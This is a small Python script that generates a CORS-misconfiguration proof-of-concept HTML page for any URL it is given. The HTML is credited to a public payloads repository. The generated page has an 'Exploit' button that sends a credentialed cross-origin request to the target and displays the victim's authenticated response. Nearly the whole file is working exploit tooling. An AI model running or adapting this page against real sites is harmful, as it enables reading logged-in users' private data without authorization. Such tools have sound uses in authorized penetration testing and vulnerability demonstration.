# CORS Misconfiguration PoC generator
# Html code from https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration

from sys import argv

try:
	url = argv[1] #https://example.com/api
except Exception:
	print("[*] Provide a (preferably vulnerable) url")
	exit()

file_name =  url.split(".")[0].split("/")[2] + "_cors_poc_" + ".html"

text = '''<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {{
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {{
                 if (this.readyState == 4 && this.status == 200) {{
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }}
             }};
              xhr.open("GET",
                       "{0}", true);
             xhr.withCredentials = true;
             xhr.send();
             }}
         </script>
     </body>
 </html>
'''.format(url)

new_file = open(file_name, "w+")
new_file.write(text)
new_file.close()

print("[*] Done")
